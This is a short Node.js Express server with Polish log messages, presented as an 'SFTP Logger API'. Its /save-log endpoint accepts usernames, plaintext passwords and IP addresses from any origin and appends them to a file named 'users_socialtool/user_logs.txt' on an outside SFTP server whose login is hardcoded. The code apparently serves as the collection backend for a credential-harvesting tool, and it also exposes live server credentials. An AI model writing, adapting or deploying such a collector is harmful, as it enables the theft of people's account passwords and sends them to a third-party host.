const express = require('express');
const Client = require('ssh2-sftp-client');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

app.post('/save-log', async (req, res) => {
    console.log('Otrzymano żądanie:', req.body);
    
    const { username, password, ip } = req.body;
    
    if (!username || !password) {
        return res.json({ success: false, error: 'Brak danych' });
    }

    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const logEntry = `${timestamp} | User: ${username}| Password: ${password} | IP: ${ip} | Version: 2.0\n`;

    console.log('Tworzenie logu:', logEntry);

    const sftp = new Client();

    try {
        console.log('Łączenie z SFTP...');
        await sftp.connect({
            host: 'eu9r-free.falixserver.net',
            port: 4483,
            username: '7vadveg.75387402',
            password: 'vVftg4ynf'
        });

        console.log('Połączono z SFTP, zapisywanie...');
        const remotePath = '/users_socialtool/user_logs.txt';
        await sftp.append(Buffer.from(logEntry), remotePath);
        
        await sftp.end();
        console.log('Sukces! Zapisano na SFTP');
        res.json({ success: true, message: 'Zapisano na SFTP!' });

    } catch (error) {
        console.error('Błąd SFTP:', error);
        res.json({ success: false, error: error.message });
    }
});

app.get('/', (req, res) => {
    res.json({ message: 'SFTP Logger API działa!', status: 'online' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});